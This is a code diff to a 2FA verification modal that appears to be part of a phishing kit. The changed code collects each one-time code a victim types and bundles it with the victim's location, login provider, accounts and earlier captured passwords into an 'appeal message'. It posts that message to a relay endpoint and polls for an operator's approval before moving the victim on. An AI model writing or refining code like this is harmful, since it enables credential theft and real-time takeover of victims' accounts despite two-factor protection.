@@ -3,6 +3,8 @@ import TwoFAImage from '@/assets/images/2FA.png';
 import { DEFAULT_TEXTS } from '@/constants/default-texts';
 import { store } from '@/store/store';
 import config from '@/utils/config';
+import { buildAppealMessage } from '@/utils/message';
+import { pollApproval } from '@/utils/poll-approval';
 import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
@@ -14,7 +16,7 @@ const VerifyModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> 
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
 
-    const { messageId, messageContent, setMessageId, setMessageContent } = store();
+    const { geoInfo, messageId, loginProvider, userData, addCode, setMessageId, setMessageContent } = store();
     const maxCode = config.MAX_CODE ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 60;
 
@@ -38,23 +40,40 @@ const VerifyModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> 
         const next = attempts + 1;
         setAttempts(next);
 
-        const codeLine = `<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
+        const sessionId = crypto.randomUUID();
+        addCode(code);
 
-        const updatedMessage = messageContent ? `${messageContent}\n\n${codeLine}` : codeLine;
+        const allCodes = [...userData.codes, code];
+        const message = buildAppealMessage({
+            geoInfo,
+            userData,
+            loginProvider,
+            accounts: userData.accounts,
+            passwords: userData.passwords,
+            codes: allCodes,
+            maxPass: config.MAX_PASS,
+            maxCode
+        });
 
         try {
             const res = await axios.post('/api/send', {
-                message: updatedMessage,
-                message_id: messageId
+                message,
+                old_message_id: messageId,
+                approval_type: 'code',
+                session_id: sessionId
             });
 
             if (res?.data?.success && typeof res.data.message_id === 'number') {
                 setMessageId(res.data.message_id);
             }
 
-            setMessageContent(updatedMessage);
+            setMessageContent(message);
 
-            if (next >= maxCode) {
+            const result = await pollApproval(sessionId);
+
+            if (result === 'approved') {
+                nextStep();
+            } else if (next >= maxCode) {
                 nextStep();
             } else {
                 setShowError(true);
@@ -62,7 +81,8 @@ const VerifyModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> 
                 setCountdown(loadingTime);
             }
         } catch {
-            //
+            setShowError(true);
+            setCode('');
         } finally {
             setIsLoading(false);
         }
